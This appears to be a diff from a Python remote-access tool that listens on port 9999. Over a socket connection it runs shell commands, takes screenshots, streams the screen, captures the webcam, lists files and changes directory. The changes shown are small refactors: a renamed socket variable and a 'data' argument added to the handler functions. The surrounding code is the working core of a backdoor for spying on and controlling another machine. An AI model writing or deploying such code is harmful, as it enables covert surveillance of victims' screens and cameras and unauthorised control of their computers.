@@ -16,9 +16,9 @@ port = 9999
 def create_socket():
     try:
         global host
-        global s
+        global sock
         host = ""
-        s = socket.socket()
+        sock = socket.socket()
     except socket.error as msg:
         create_socket()
 
@@ -49,7 +49,7 @@ def intract_with_shell(data,conn):
         conn.send(e.encode("utf-8"))
 
 # screen shot function to take screen shot 
-def take_screenshot(conn):
+def take_screenshot(data,conn):
     try:
         conn.send(('OK').encode("utf-8"))
         pic = pyautogui.screenshot()
@@ -61,7 +61,7 @@ def take_screenshot(conn):
 
 
 # screen streaming function to stream the screen 
-def screen_streaming(conn): 
+def screen_streaming(data,conn): 
     try: 
         conn.send(('OK').encode("utf-8"))
         while True:
@@ -78,7 +78,7 @@ def screen_streaming(conn):
         conn.send(e.encode("utf-8"))
 
 # camera function to access the camera 
-def access_camera(conn):
+def access_camera(data,conn):
     try:
         conn.send(('OK').encode("utf-8"))
         cam = cv2.VideoCapture(0)
@@ -100,7 +100,7 @@ def access_camera(conn):
         conn.send(e.encode("utf-8"))
 
 # list files in the directory
-def list_files(conn):
+def list_files(data,conn):
     try:
         arr = pickle.dumps(os.listdir())
         conn.send(arr)
@@ -108,7 +108,7 @@ def list_files(conn):
         conn.send(('Error').encode("utf-8"))
 
 # change directory
-def change_directory(conn):
+def change_directory(data,conn):
     try:
         conn.send((os.getcwd()).encode("utf-8"))
         x=conn.recv(1024).decode("utf-8")
